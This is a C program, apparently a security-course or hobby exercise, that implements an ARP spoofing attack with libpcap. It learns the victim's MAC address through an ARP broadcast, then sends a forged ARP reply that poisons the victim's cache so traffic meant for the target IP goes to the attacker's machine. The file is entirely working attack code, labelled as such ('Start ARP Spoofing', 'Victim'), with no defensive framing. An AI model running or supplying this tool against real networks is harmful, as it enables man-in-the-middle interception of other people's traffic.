#include <stdio.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>

typedef enum _ARP_OPCODE
{
	ARP_Request = 1,
	ARP_Reply = 2,
} ARP_OPCODE;

typedef struct _ETHER_HEADER
{
	u_int8_t destHA[6];
	u_int8_t sourceHA[6];
	u_int16_t type;
} __attribute__((packed)) ETHER_HEADER, *LPETHER_HEADER;

typedef struct _ARP_HEADER
{
	u_int16_t hardwareType;
	u_int16_t protocolType;
	u_char hardwareAddressLength;
	u_char protocolAddressLength;
	u_int16_t operationCode;
	u_char senderHA[6];
	u_int32_t senderIP;
	u_char targetHA[6];
	u_int32_t targetIP;
} __attribute__((packed)) ARP_HEADER, *LPARP_HEADER;

int main(int argc, char **argv)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	char *dev, *sender_ip, *target_ip;
	pcap_t *handle;
	u_char packet[1500];
	struct ifreq if_mac, if_ip;
	uint8_t localMacAddress[6];
	uint32_t localIPAddress;
	int sockfd, i;

	if (argc != 4)
	{
		printf("Usage : %s [Interface] [Sender IP] [Target IP] \n", argv[0]);
		return 2;
	}

	dev = argv[1];
	sender_ip = argv[2];
	target_ip = argv[3];

	handle = pcap_open_live(dev, BUFSIZ, 1, 300, errbuf);

	if (handle == NULL)
	{
		printf("[-] Couldn`t open Device %s : %s\n", dev, errbuf);
		return 2;
	}

	if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1)
	{
		printf("[-] Open Raw Socket Erorr \n");
		return 2;
	}

	// Get Local MAC Address and IP
	strncpy(if_mac.ifr_name, dev, IFNAMSIZ-1);
	strncpy(if_ip.ifr_name, dev, IFNAMSIZ-1);
	ioctl(sockfd, SIOCGIFHWADDR, &if_mac);
	ioctl(sockfd, SIOCGIFADDR, &if_ip);
	memcpy(localMacAddress, if_mac.ifr_hwaddr.sa_data, 6);
	printf("%s \n", localMacAddress);
	localIPAddress = ((struct sockaddr_in *)&if_ip.ifr_addr)->sin_addr.s_addr;

	// Make ARP Packet
	LPETHER_HEADER etherHeader = (LPETHER_HEADER)packet;

	memcpy(etherHeader->destHA, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
	memcpy(etherHeader->sourceHA, localMacAddress, 6);
	etherHeader->type = ntohs(ETHERTYPE_ARP);

	LPARP_HEADER arpHeader = (LPARP_HEADER)(packet + sizeof(ETHER_HEADER));
	arpHeader->hardwareType = ntohs(1);
	arpHeader->protocolType = ntohs(ETHERTYPE_IP);
	arpHeader->hardwareAddressLength = 6;
	arpHeader->protocolAddressLength = 4;
	arpHeader->operationCode = ntohs(ARP_Request);
	arpHeader->senderIP = localIPAddress;
	arpHeader->targetIP = inet_addr(sender_ip);
	memcpy(arpHeader->senderHA, localMacAddress, 6);
	memcpy(arpHeader->targetHA, "\x00\x00\x00\x00\x00\x00", 6);

	printf("[*] Send ARP Broadcast for get Victim MAC Address \n");
	pcap_sendpacket(handle, packet, sizeof(ETHER_HEADER)+sizeof(ARP_HEADER));

	const u_char *captured_packet;
	struct pcap_pkthdr *header;
	uint8_t victimHA[6];

	while (pcap_next_ex(handle, &header, &captured_packet) >= 0)
	{
		if (!captured_packet)
			continue;

		LPETHER_HEADER capturedEtherHeader = (LPETHER_HEADER)captured_packet;

		if (ntohs(capturedEtherHeader->type) != ETHERTYPE_ARP)
			continue;

		LPARP_HEADER capturedArpHeader = (LPARP_HEADER)(captured_packet+sizeof(ETHER_HEADER));

		// Check Sender is equal to Vimtim
		if (ntohs(capturedArpHeader->protocolType) == ETHERTYPE_IP && 
			ntohs(capturedArpHeader->operationCode) == ARP_Reply && 
			capturedArpHeader->senderIP == arpHeader->targetIP)
		{
			printf("[*] Received ARP from %s \n", sender_ip);
			printf("[*] %s MAC Address : ", sender_ip);
			for(int i=0; i<6; i++)
				printf("%02x ", capturedArpHeader->senderHA[i]);
			printf("\n");
			memcpy(victimHA, capturedArpHeader->senderHA, 6);
			break;
		}

	}

	// Start ARP Spoofing
	memcpy(etherHeader->destHA, victimHA, 6);
	arpHeader->operationCode = ntohs(ARP_Reply);
	arpHeader->senderIP = inet_addr(target_ip);
	arpHeader->targetIP = inet_addr(sender_ip);
	memcpy(arpHeader->targetHA, victimHA, 6);

	printf("[!] Start ARP Spoofing !! \n");
	pcap_sendpacket(handle, packet, sizeof(ETHER_HEADER)+sizeof(ARP_HEADER));
	pcap_close(handle);

	return 0;
}
